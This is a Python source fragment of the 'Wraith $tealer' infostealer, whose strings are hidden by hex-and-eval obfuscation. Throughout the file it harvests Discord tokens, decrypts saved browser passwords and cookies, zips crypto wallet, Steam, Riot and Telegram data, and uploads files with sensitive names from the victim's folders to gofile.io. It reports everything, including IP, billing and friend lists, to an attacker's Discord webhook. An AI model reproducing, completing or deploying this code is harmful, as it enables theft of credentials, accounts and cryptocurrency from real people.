    ipdata=loads(ipdatanojson)
    contry=ipdata['country_name']
    contryCode=ipdata['country_code'].lower()
    globalinfo=eval(binascii.unhexlify(b'66223a666c61675f7b636f6e747279436f64657d3a20202d20607b757365726e616d652e757070657228297d207c207b69707d20287b636f6e7472797d296022').decode('8ftu'[::+-+-(-(+1))]))
    return globalinfo
def Trust(Cookies):
    global DETECTED
    data=str(Cookies)
    tim=re.findall('.google.com',data)
    if len(tim)<-1:
        DETECTED=True
        return DETECTED
    else:
        DETECTED=False
        return DETECTED
def GetUHQFriends(token):
    badgeList=[
{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},
{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},
{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},
{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},
{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},
{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},
{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},
{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},
{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},
{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}
]
    headers={
        'Authorization':token,
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
    try:
        friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())
    except:
        return False
    uhqlist=''
    for friend in friendlist:
        OwnedBadges=''
        flags=friend['user']['public_flags']
        for badge in badgeList:
            if flags//badge['Value']!=0 and friend['type']==1:
                if not 'House' in badge['Name']:
                    OwnedBadges+=badge['Emoji']
                flags=flags % badge['Value']
        if OwnedBadges !='':
            uhqlist+=eval(binascii.unhexlify(b'66227b4f776e65644261646765737d207c207b667269656e645b2775736572275d5b27757365726e616d65275d7d237b667269656e645b2775736572275d5b276469736372696d696e61746f72275d7d20287b667269656e645b2775736572275d5b276964275d7d295c6e22').decode('8ftu'[::+-+-(-(+1))]))
    return uhqlist
def GetBilling(token):
    headers={
        'Authorization':token,
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
    try:
        billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())
    except:
        return False
    if billingjson==[]:return ' -'
    billing=''
    for methode in billingjson:
        if methode['invalid']==False:
            if methode['type']==1:
                billing+=':credit_card:'
            elif methode['type']==2:
                billing+=':parking: '
    return billing
def GetBadge(flags):
    if flags==0:return ''
    OwnedBadges=''
    badgeList=[
{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},
{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},
{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},
{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},
{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},
{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},
{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},
{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},
{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},
{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}
]
    for badge in badgeList:
        if flags//badge['Value']!=0:
            OwnedBadges+=badge['Emoji']
            flags=flags % badge['Value']
    return OwnedBadges
def GetTokenInfo(token):
    headers={
        'Authorization':token,
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
    userjson=loads(urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers)).read().decode())
    username=userjson['username']
    hashtag=userjson['discriminator']
    email=userjson['email']
    idd=userjson['id']
    pfp=userjson['avatar']
    flags=userjson['public_flags']
    nitro=''
    phone='-'
    if 'premium_type' in userjson:
        nitrot=userjson['premium_type']
        if nitrot==1:
            nitro='<:classic:896119171019067423> '
        elif nitrot==2:
            nitro='<a:boost:824036778570416129> <:classic:896119171019067423> '
    if 'phone' in userjson:phone=eval(binascii.unhexlify(b'6627607b757365726a736f6e5b2270686f6e65225d7d6027').decode('8ftu'[::+-+-(-(+1))]))
    return username,hashtag,email,idd,pfp,flags,nitro,phone
def checkToken(token):
    headers={
        'Authorization':token,
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
    try:
        urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers))
        return True
    except:
        return False
def uploadToken(token,path):
    global hook
    headers={
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
    username,hashtag,email,idd,pfp,flags,nitro,phone=GetTokenInfo(token)
    if pfp==None:
        pfp='https://cdn.discordapp.com/attachments/1090974344722792560/1124024063040438302/image.png'
    else:
        pfp=eval(binascii.unhexlify(b'662268747470733a2f2f63646e2e646973636f72646170702e636f6d2f617661746172732f7b6964647d2f7b7066707d22').decode('8ftu'[::+-+-(-(+1))]))
    billing=GetBilling(token)
    badge=GetBadge(flags)
    friends=GetUHQFriends(token)
    if friends=='':friends='No Rare Friends'
    if not billing:
        badge,phone,billing=ODODOooooDoODOOoOD,ODDDDDoOOoDOoDDoOo,LJLJLJIILILLLJJILJIJIJ
    if nitro=='' and badge=='':nitro=' -'
    data={
        'content':eval(binascii.unhexlify(b'66277b676c6f62616c496e666f28297d207c20466f756e6420696e20607b706174687d6027').decode('8ftu'[::+-+-(-(+1))])),
        'embeds':[
{
            'color':10181046,
            'fields':[
{
                    'name':':rocket: Token:',
                    'value':eval(binascii.unhexlify(b'6622607b746f6b656e7d605c6e5b436c69636b20746f20636f70795d2868747470733a2f2f7375706572667572727963646e2e6e6c2f636f70792f7b746f6b656e7d2922').decode('8ftu'[::+-+-(-(+1))]))
},
{
                    'name':':envelope: Email:',
                    'value':eval(binascii.unhexlify(b'6622607b656d61696c7d6022').decode('8ftu'[::+-+-(-(+1))])),
                    'inline':True
},
{
                    'name':':mobile_phone: Phone:',
                    'value':eval(binascii.unhexlify(b'66227b70686f6e657d22').decode('8ftu'[::+-+-(-(+1))])),
                    'inline':True
},
{
                    'name':':globe_with_meridians: IP:',
                    'value':eval(binascii.unhexlify(b'6622607b676574697028297d6022').decode('8ftu'[::+-+-(-(+1))])),
                    'inline':True
},
{
                    'name':':beginner: Badges:',
                    'value':eval(binascii.unhexlify(b'66227b6e6974726f7d7b62616467657d22').decode('8ftu'[::+-+-(-(+1))])),
                    'inline':True
},
{
                    'name':':credit_card: Billing:',
                    'value':eval(binascii.unhexlify(b'66227b62696c6c696e677d22').decode('8ftu'[::+-+-(-(+1))])),
                    'inline':True
},
{
                    'name':':clown: HQ Friends:',
                    'value':eval(binascii.unhexlify(b'66227b667269656e64737d22').decode('8ftu'[::+-+-(-(+1))])),
                    'inline':False
}
],
            'author':{
                'name':eval(binascii.unhexlify(b'66227b757365726e616d657d237b686173687461677d20287b6964647d2922').decode('8ftu'[::+-+-(-(+1))])),
                'icon_url':eval(binascii.unhexlify(b'66227b7066707d22').decode('8ftu'[::+-+-(-(+1))]))
},
            'footer':{
                'text':'wraith on top',
                'icon_url':'https://cdn.discordapp.com/attachments/1090974344722792560/1124024063040438302/image.png'
},
            'thumbnail':{
                'url':eval(binascii.unhexlify(b'66227b7066707d22').decode('8ftu'[::+-+-(-(+1))]))
}
}
],
        'avatar_url':'https://cdn.discordapp.com/attachments/1090974344722792560/1124024063040438302/image.png',
        'username':'Wraith $tealer',
        'attachments':[]
}
    LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
def Reformat(listt):
    e=re.findall('(\\w+[a-z])',listt)
    while 'https' in e:e.remove('https')
    while 'com' in e:e.remove('com')
    while 'net' in e:e.remove('net')
    return list(set(e))
def upload(name,link):
    headers={
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
    if name=='wpcook':
        rb=' | '.join(da for da in cookiWords)
        if len(rb)>1000:
            rrrrr=Reformat(str(cookiWords))
            rb=' | '.join(da for da in rrrrr)
        data={
            'content':globalInfo(),
            'embeds':[
{
                    'title':'Wraith | Cookies Stealer',
                    'description':eval(binascii.unhexlify(b'66222a2a466f756e642a2a3a5c6e7b72627d5c6e5c6e2a2a446174613a2a2a5c6e3a636f6f6b69653a20e280a2202a2a7b436f6f6b69436f756e747d2a2a20436f6f6b69657320466f756e645c6e3a6c696e6b3a20e280a2205b577261697468436f6f6b6965732e7478745d287b6c696e6b7d2922').decode('8ftu'[::+-+-(-(+1))])),
                    'color':10181046,
                    'footer':{
                        'text':'wraith on top',
                        'icon_url':'https://cdn.discordapp.com/attachments/1090974344722792560/1124024063040438302/image.png'
}
}
],
            'username':'Wraith $tealer',
            'avatar_url':'https://cdn.discordapp.com/attachments/1090974344722792560/1124024063040438302/image.png',
            'attachments':[]
}
        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
        return
    if name=='wppassw':
        ra=' | '.join(da for da in paswWords)
        if len(ra)>1000:
            rrr=Reformat(str(paswWords))
            ra=' | '.join(da for da in rrr)
        data={
            'content':globalInfo(),
            'embeds':[
{
                    'title':'Wraith | Password Stealer',
                    'description':eval(binascii.unhexlify(b'66222a2a466f756e642a2a3a5c6e7b72617d5c6e5c6e2a2a446174613a2a2a5c6ef09f949120e280a2202a2a7b5061737377436f756e747d2a2a2050617373776f72647320466f756e645c6e3a6c696e6b3a20e280a2205b57726169746850617373776f7264732e7478745d287b6c696e6b7d2922').decode('8ftu'[::+-+-(-(+1))])),
                    'color':10181046,
                    'footer':{
                        'text':'wraith on top',
                        'icon_url':'https://cdn.discordapp.com/attachments/1090974344722792560/1124024063040438302/image.png'
}
}
],
            'username':'Wraith $tealer',
            'avatar_url':'https://cdn.discordapp.com/attachments/1090974344722792560/1124024063040438302/image.png',
            'attachments':[]
}
        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
        return
    if name=='kiwi':
        data={
            'content':globalInfo(),
            'embeds':[
{
                'color':10181046,
                'fields':[
{
                    'name':'Interesting files found on user PC:',
                    'value':link
}
],
                'author':{
                    'name':'Wraith | File Stealer'
},
                'footer':{
                    'text':'wraith on top',
                    'icon_url':'https://cdn.discordapp.com/attachments/1090974344722792560/1124024063040438302/image.png'
}
}
],
            'username':'Wraith $tealer',
            'avatar_url':'https://cdn.discordapp.com/attachments/1090974344722792560/1124024063040438302/image.png',
            'attachments':[]
}
        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
        return
def writeforfile(data,name):
    path=os.getenv('TEMP')+eval(binascii.unhexlify(b'66225c77707b6e616d657d2e74787422').decode('8ftu'[::+-+-(-(+1))]))
    with open(path,mode='w',encoding='utf-8')as f:
        f.write(eval(binascii.unhexlify(b'66223c2d2d57726169746820247465616c6572204f4e20544f502d2d3e5c6e5c6e22').decode('8ftu'[::+-+-(-(+1))])))
        for line in data:
            if line[0]!='':
                f.write(eval(binascii.unhexlify(b'66227b6c696e657d5c6e22').decode('8ftu'[::+-+-(-(+1))])))
Tokens=''
def getToken(path,arg):
    if not os.path.exists(path):return
    path+=arg
    for file in os.listdir(path):
        if file.endswith('.log')or file.endswith('.ldb'):
            for line in[x.strip()for x in open(eval(binascii.unhexlify(b'66227b706174687d5c5c7b66696c657d22').decode('8ftu'[::+-+-(-(+1))])),errors='ignore').readlines()if x.strip()]:
                for regex in('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}','mfa\\.[\\w-]{80,95}'):
                    for token in re.findall(regex,line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                Tokens+=token
                                uploadToken(token,path)
Passw=[]
def getPassw(path,arg):
    global Passw,PasswCount
    if not os.path.exists(path):return
    pathC=path+arg+'/Login Data'
    if os.stat(pathC).st_size==0:return
    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'
    shutil.copy2(pathC,tempfold)
    conn=sql_connect(tempfold)
    cursor=conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins;')
    data=cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    pathKey=path+'/Local State'
    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())
    master_key=b64decode(local_state['os_crypt']['encrypted_key'])
    master_key=CryptUnprotectData(master_key[5:])
    for row in data:
        if row[0]!='':
            for wa in keyword:
                old=wa
                if 'https' in wa:
                    tmp=wa
                    wa=tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords:paswWords.append(old)
            Passw.append(eval(binascii.unhexlify(b'66225552313a207b726f775b305d7d207c20553533524e344d333a207b726f775b315d7d207c2050343535573052443a207b4465637279707456616c756528726f775b325d2c206d61737465725f6b6579297d22').decode('8ftu'[::+-+-(-(+1))])))
            PasswCount+=1
    writeforfile(Passw,'passw')
Cookies=[]
def getCookie(path,arg):
    global Cookies,CookiCount
    if not os.path.exists(path):return
    pathC=path+arg+'/Cookies'
    if os.stat(pathC).st_size==0:return
    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'
    shutil.copy2(pathC,tempfold)
    conn=sql_connect(tempfold)
    cursor=conn.cursor()
    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
    data=cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    pathKey=path+'/Local State'
    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())
    master_key=b64decode(local_state['os_crypt']['encrypted_key'])
    master_key=CryptUnprotectData(master_key[5:])
    for row in data:
        if row[0]!='':
            for wa in keyword:
                old=wa
                if 'https' in wa:
                    tmp=wa
                    wa=tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords:cookiWords.append(old)
            Cookies.append(eval(binascii.unhexlify(b'662248303537204b33593a207b726f775b305d7d207c204e344d333a207b726f775b315d7d207c2056343155333a207b4465637279707456616c756528726f775b325d2c206d61737465725f6b6579297d22').decode('8ftu'[::+-+-(-(+1))])))
            CookiCount+=1
    writeforfile(Cookies,'cook')
def GetDiscord(path,arg):
    if not os.path.exists(eval(binascii.unhexlify(b'66227b706174687d2f4c6f63616c20537461746522').decode('8ftu'[::+-+-(-(+1))]))):return
    pathC=path+arg
    pathKey=path+'/Local State'
    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())
    master_key=b64decode(local_state['os_crypt']['encrypted_key'])
    master_key=CryptUnprotectData(master_key[5:])
    for file in os.listdir(pathC):
        if file.endswith('.log')or file.endswith('.ldb'):
            for line in[x.strip()for x in open(eval(binascii.unhexlify(b'66227b70617468437d5c5c7b66696c657d22').decode('8ftu'[::+-+-(-(+1))])),errors='ignore').readlines()if x.strip()]:
                for token in re.findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',line):
                    global Tokens
                    tokenDecoded=DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]),master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            Tokens+=tokenDecoded
                            uploadToken(tokenDecoded,path)
def GatherZips(paths1,paths2,paths3):
    thttht=[]
    for patt in paths1:
        a=threading.Thread(target=ZipThings,args=[patt[0],patt[5],patt[1]])
        a.start()
        thttht.append(a)
    for patt in paths2:
        a=threading.Thread(target=ZipThings,args=[patt[0],patt[2],patt[1]])
        a.start()
        thttht.append(a)
    a=threading.Thread(target=ZipTelegram,args=[paths3[0],paths3[2],paths3[1]])
    a.start()
    thttht.append(a)
    for thread in thttht:
        thread.join()
    global WalletsZip,GamingZip,OtherZip
    exodus_link,atolink='',''
    try:
        exodus_link=[item[1]for item in WalletsZip if item[0]=='Exodus'][0]
    except:pass
    try:
        atolink=[item[1]for item in WalletsZip if item[0]=='atomic'][0]
    except:pass
    if exodus_link !='':
        threading.Thread(target=exodus_injection,args=[os.path.join(local,'exodus'),'exodus.exe',exodus_link]).start()
    wal,ga,ot='','',''
    if not len(WalletsZip)==0:
        wal=':coin:  �  Wallets\n'
        for i in WalletsZip:
            wal+=eval(binascii.unhexlify(b'6622e29494e29480205b7b695b305d7d5d287b695b315d7d295c6e22').decode('8ftu'[::+-+-(-(+1))]))
    if not len(GamingZip)==0:
        ga=':video_game:  �  Gaming:\n'
        for i in GamingZip:
            ga+=eval(binascii.unhexlify(b'6622e29494e29480205b7b695b305d7d5d287b695b315d7d295c6e22').decode('8ftu'[::+-+-(-(+1))]))
    if not len(OtherZip)==0:
        ot=':tickets:  �  Apps\n'
        for i in OtherZip:
            ot+=eval(binascii.unhexlify(b'6622e29494e29480205b7b695b305d7d5d287b695b315d7d295c6e22').decode('8ftu'[::+-+-(-(+1))]))
    headers={
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
    data={
        'content':globalInfo(),
        'embeds':[
{
            'title':'Wraith Zips',
            'description':eval(binascii.unhexlify(b'66227b77616c7d5c6e7b67617d5c6e7b6f747d22').decode('8ftu'[::+-+-(-(+1))])),
            'color':10181046,
            'footer':{
                'text':'wraith on top',
                'icon_url':'https://cdn.discordapp.com/attachments/1090974344722792560/1124024063040438302/image.png'
}
}
],
        'username':'Wraith $tealer',
        'avatar_url':'https://cdn.discordapp.com/attachments/1090974344722792560/1124024063040438302/image.png',
        'attachments':[]
}
    LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
def ZipTelegram(path,arg,procc):
    global OtherZip
    pathC=path
    name=arg
    if not os.path.exists(pathC):return
    subprocess.Popen(eval(binascii.unhexlify(b'66227461736b6b696c6c202f696d207b70726f63637d202f74202f66203e6e756c20323e263122').decode('8ftu'[::+-+-(-(+1))])),shell=True)
    zf=ZipFile(eval(binascii.unhexlify(b'66227b70617468437d2f7b6e616d657d2e7a697022').decode('8ftu'[::+-+-(-(+1))])),'w')
    for file in os.listdir(pathC):
        if not '.zip' in file and not 'tdummy' in file and not 'user_data' in file and not 'webview' in file:
            zf.write(pathC+'/'+file)
    zf.close()
    lnik=uploadToAnonfiles(eval(binascii.unhexlify(b'66277b70617468437d2f7b6e616d657d2e7a697027').decode('8ftu'[::+-+-(-(+1))])))
    os.remove(eval(binascii.unhexlify(b'66227b70617468437d2f7b6e616d657d2e7a697022').decode('8ftu'[::+-+-(-(+1))])))
    OtherZip.append([arg,lnik])
def ZipThings(path,arg,procc):
    pathC=path
    name=arg
    global WalletsZip,GamingZip,OtherZip
    if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:
        browser=path.split('\\')[4].split('/')[1].replace(' ','')
        name=eval(binascii.unhexlify(b'66224d6574616d61736b5f7b62726f777365727d22').decode('8ftu'[::+-+-(-(+1))]))
        pathC=path+arg
    if not os.path.exists(pathC):return
    subprocess.Popen(eval(binascii.unhexlify(b'66227461736b6b696c6c202f696d207b70726f63637d202f74202f66203e6e756c20323e263122').decode('8ftu'[::+-+-(-(+1))])),shell=True)
    if 'Wallet' in arg or 'NationsGlory' in arg:
        browser=path.split('\\')[4].split('/')[1].replace(' ','')
        name=eval(binascii.unhexlify(b'66227b62726f777365727d22').decode('8ftu'[::+-+-(-(+1))]))
    elif 'Steam' in arg:
        if not os.path.isfile(eval(binascii.unhexlify(b'66227b70617468437d2f6c6f67696e75736572732e76646622').decode('8ftu'[::+-+-(-(+1))]))):return
        f=open(eval(binascii.unhexlify(b'66227b70617468437d2f6c6f67696e75736572732e76646622').decode('8ftu'[::+-+-(-(+1))])),'r+',encoding='utf8')
        data=f.readlines()
        found=False
        for l in data:
            if 'RememberPassword"		"1"' in l:
                found=True
        if found==False:return
        name=arg
    zf=ZipFile(eval(binascii.unhexlify(b'66227b70617468437d2f7b6e616d657d2e7a697022').decode('8ftu'[::+-+-(-(+1))])),'w')
    for file in os.listdir(pathC):
        if not '.zip' in file:zf.write(pathC+'/'+file)
    zf.close()
    lnik=uploadToAnonfiles(eval(binascii.unhexlify(b'66277b70617468437d2f7b6e616d657d2e7a697027').decode('8ftu'[::+-+-(-(+1))])))
    os.remove(eval(binascii.unhexlify(b'66227b70617468437d2f7b6e616d657d2e7a697022').decode('8ftu'[::+-+-(-(+1))])))
    if 'Wallet' in arg or 'eogaeaoehlef' in arg:
        WalletsZip.append([name,lnik])
    elif 'NationsGlory' in name or 'Steam' in name or 'RiotCli' in name:
        GamingZip.append([name,lnik])
    else:
        OtherZip.append([name,lnik])
def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths=[
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f4f7065726120536f6674776172652f4f7065726120475820537461626c6522').decode('8ftu'[::+-+-(-(+1))])),'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f4f7065726120536f6674776172652f4f7065726120537461626c6522').decode('8ftu'[::+-+-(-(+1))])),'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f4f7065726120536f6674776172652f4f70657261204e656f6e2f5573657220446174612f44656661756c7422').decode('8ftu'[::+-+-(-(+1))])),'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[eval(binascii.unhexlify(b'66227b6c6f63616c7d2f476f6f676c652f4368726f6d652f55736572204461746122').decode('8ftu'[::+-+-(-(+1))])),'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[eval(binascii.unhexlify(b'66227b6c6f63616c7d2f476f6f676c652f4368726f6d65205378532f55736572204461746122').decode('8ftu'[::+-+-(-(+1))])),'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[eval(binascii.unhexlify(b'66227b6c6f63616c7d2f4272617665536f6674776172652f42726176652d42726f777365722f55736572204461746122').decode('8ftu'[::+-+-(-(+1))])),'brave.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[eval(binascii.unhexlify(b'66227b6c6f63616c7d2f59616e6465782f59616e64657842726f777365722f55736572204461746122').decode('8ftu'[::+-+-(-(+1))])),'yandex.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[eval(binascii.unhexlify(b'66227b6c6f63616c7d2f4d6963726f736f66742f456467652f55736572204461746122').decode('8ftu'[::+-+-(-(+1))])),'edge.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn']
]
    discordPaths=[
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f446973636f726422').decode('8ftu'[::+-+-(-(+1))])),'/Local Storage/leveldb'],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f4c69676874636f726422').decode('8ftu'[::+-+-(-(+1))])),'/Local Storage/leveldb'],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f646973636f726463616e61727922').decode('8ftu'[::+-+-(-(+1))])),'/Local Storage/leveldb'],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f646973636f726470746222').decode('8ftu'[::+-+-(-(+1))])),'/Local Storage/leveldb'],
]
    PathsToZip=[
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f61746f6d69632f4c6f63616c2053746f726167652f6c6576656c646222').decode('8ftu'[::+-+-(-(+1))])),'"Atomic Wallet.exe"','Wallet'],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f45786f6475732f65786f6475732e77616c6c657422').decode('8ftu'[::+-+-(-(+1))])),'Exodus.exe','Wallet'],
['C:\\Program Files (x86)\\Steam\\config','steam.exe','Steam'],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f4e6174696f6e73476c6f72792f4c6f63616c2053746f726167652f6c6576656c646222').decode('8ftu'[::+-+-(-(+1))])),'NationsGlory.exe','NationsGlory'],
[eval(binascii.unhexlify(b'66227b6c6f63616c7d2f52696f742047616d65732f52696f7420436c69656e742f4461746122').decode('8ftu'[::+-+-(-(+1))])),'RiotClientServices.exe','RiotClient']
]
    Telegram=[eval(binascii.unhexlify(b'66227b726f616d696e677d2f54656c656772616d204465736b746f702f746461746122').decode('8ftu'[::+-+-(-(+1))])),'telegram.exe','Telegram']
    for patt in browserPaths:
        a=threading.Thread(target=getToken,args=[patt[0],patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths:
        a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]])
        a.start()
        Threadlist.append(a)
    for patt in browserPaths:
        a=threading.Thread(target=getPassw,args=[patt[0],patt[3]])
        a.start()
        Threadlist.append(a)
    ThCokk=[]
    for patt in browserPaths:
        a=threading.Thread(target=getCookie,args=[patt[0],patt[4]])
        a.start()
        ThCokk.append(a)
    threading.Thread(target=GatherZips,args=[browserPaths,PathsToZip,Telegram]).start()
    for thread in ThCokk:thread.join()
    DETECTED=Trust(Cookies)
    if DETECTED==True:return
    for thread in Threadlist:
        thread.join()
    global upths
    upths=[]
    for file in['wppassw.txt','wpcook.txt']:
        upload(file.replace('.txt',''),uploadToAnonfiles(os.getenv('TEMP')+'\\'+file))
def uploadToAnonfiles(path):
    try:return requests.post(eval(binascii.unhexlify(b'662768747470733a2f2f7b72657175657374732e676574282268747470733a2f2f6170692e676f66696c652e696f2f67657453657276657222292e6a736f6e28295b2264617461225d5b22736572766572225d7d2e676f66696c652e696f2f75706c6f616446696c6527').decode('8ftu'[::+-+-(-(+1))])),files={'file':open(path,'rb')}).json()['data']['downloadPage']
    except:return False
def KiwiFolder(pathF,keywords):
    global KiwiFiles
    maxfilesperdir=7
    i=0
    listOfFile=os.listdir(pathF)
    ffound=[]
    for file in listOfFile:
        if not os.path.isfile(pathF+'/'+file):return
        i+=1
        if i<=maxfilesperdir:
            url=uploadToAnonfiles(pathF+'/'+file)
            ffound.append([pathF+'/'+file,url])
        else:
            break
    KiwiFiles.append(['folder',pathF+'/',ffound])
KiwiFiles=[]
def KiwiFile(path,keywords):
    global KiwiFiles
    fifound=[]
    listOfFile=os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path+'/'+file)and '.txt' in file:
                    fifound.append([path+'/'+file,uploadToAnonfiles(path+'/'+file)])
                    break
                if os.path.isdir(path+'/'+file):
                    target=path+'/'+file
                    KiwiFolder(target,keywords)
                    break
    KiwiFiles.append(['folder',path,fifound])
def Kiwi():
    user=temp.split('\\AppData')[0]
    path2search=[
        user+'/Desktop',
        user+'/Downloads',
        user+'/Documents'
]
    key_wordsFolder=[
        'account',
        'acount',
        'passw',
        'secret'
]
    key_wordsFiles=[
        'passw',
        'mdp',
        'motdepasse',
        'mot_de_passe',
        'login',
        'secret',
        'account',
        'acount',
        'paypal',
        'banque',
        'account',
        'metamask',
        'wallet',
        'crypto',
        'exodus',
        'discord',
        '2fa',
        'code',
        'memo',
        'compte',
        'token',
        'backup',
        'secret'
]
    wikith=[]
    for patt in path2search:
        kiwi=threading.Thread(target=KiwiFile,args=[patt,key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith
global keyword,cookiWords,paswWords,CookiCount,PasswCount,WalletsZip,GamingZip,OtherZip
keyword=[
    'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)'
]
CookiCount,PasswCount=0,0
cookiWords=[]
paswWords=[]
WalletsZip=[]#[Name,Link]
GamingZip=[]
OtherZip=[]
GatherAll()
